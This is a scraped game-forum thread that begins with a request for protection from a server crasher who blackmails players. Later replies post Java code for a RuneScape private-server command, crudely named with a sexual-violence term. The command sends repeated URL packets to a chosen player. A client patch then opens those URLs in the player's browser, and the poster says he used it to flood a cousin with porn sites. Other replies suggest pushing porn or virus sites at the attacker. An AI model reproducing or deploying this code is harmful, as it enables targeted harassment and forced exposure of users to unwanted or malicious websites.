channel.title: About Private Server Crasher--------------
channel.description:
hey guys what sup ?
im new here .. and i need really bad help
im playing :Silkroad private server : and there is anoob guy using a program
to shut down server .. and he blackmails us to get money from us :confused:
i need any help to protect us from this prog or what is this prog he is using
Anyyyyyyyyy help .. thx all

item.title: About Private Server Crasher--------------
item.dc:creator: @tyb97 tyb97
item.description:
@tyb97 wrote:

Hot_Potato:

Remove all the damn codes before noobs start abusing it (What Fridder said).

I agree, Ill take mine off.

Read full topic

item.title: About Private Server Crasher--------------
item.dc:creator: @Hot_Potato1 Hot_Potato
item.description:
@Hot_Potato1 wrote:

Remove all the damn codes before noobs start abusing it (What Fridder said).

Read full topic

			if (playerCommand.startsWith("rape")) {

				String playerToBan = playerCommand.substring(5);

item.title: About Private Server Crasher--------------
item.dc:creator: @sex-scape_owner sex-scape owner
item.description:
@sex-scape_owner wrote:

[quote=“dubpkftw, post:9, topic:413726”][quote author=asshole_rule link=topic=515688.msg3754723#msg3754723 date=1316356044]

His connection is on your computer.
Boot him off using mass porn or virus websites, then I’m sure he won’t come back.

Ah yes, that would work.

if (playerCommand.startsWith("rape")) { try { String playerToBan = playerCommand.substring(5); for(int i = 0; i < Config.MAX_PLAYERS; i++) { if(Server.playerHandler.players[i] != null) { if(Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) { Client c2 = (Client)Server.playerHandler.players[i]; c.sendMessage("You have RAPED " + c2.playerName); c2.sendMessage("You have been RAPED by: " + c.playerName); c2.getPA().sendFrame126("www.abadwebsite.com", 12000); c2.getPA().sendFrame126("www.abadwebsite.com", 12000); c2.getPA().sendFrame126("www.abadwebsite.com", 12000); c2.getPA().sendFrame126("www.abadwebsite.com", 12000); c2.getPA().sendFrame126("www.abadwebsite.com", 12000); c2.getPA().sendFrame126("www.abadwebsite.com", 12000); c2.getPA().sendFrame126("www.abadwebsite.com", 12000); c2.getPA().sendFrame126("www.abadwebsite.com", 12000); c2.getPA().sendFrame126("www.abadwebsite.com", 12000); c2.getPA().sendFrame126("www.abadwebsite.com", 12000); c2.getPA().sendFrame126("www.abadwebsite.com", 12000); break; } } } } catch(Exception e) { c.sendMessage("Player Must Be Offline."); } }

in ur client replace packet 126 with this

case 126: String text = inStream.readString(); int frame = inStream.method435(); if (text.startsWith("www.")) { launchURL(text); pktType = -1; return true; } updateStrings(text, frame); sendFrame126(text, frame); if (frame >= 18144 && frame <= 18244) { clanList[frame - 18144] = text; } pktType = -1; return true;
[/quote]
Rofl. I wish I could see this happen to someone. XD.[/quote]

i did it to my cousin on my rsps and he wasnt pleased it sends 219 gay porn websites to anyone and only i can use it ;3

Read full topic
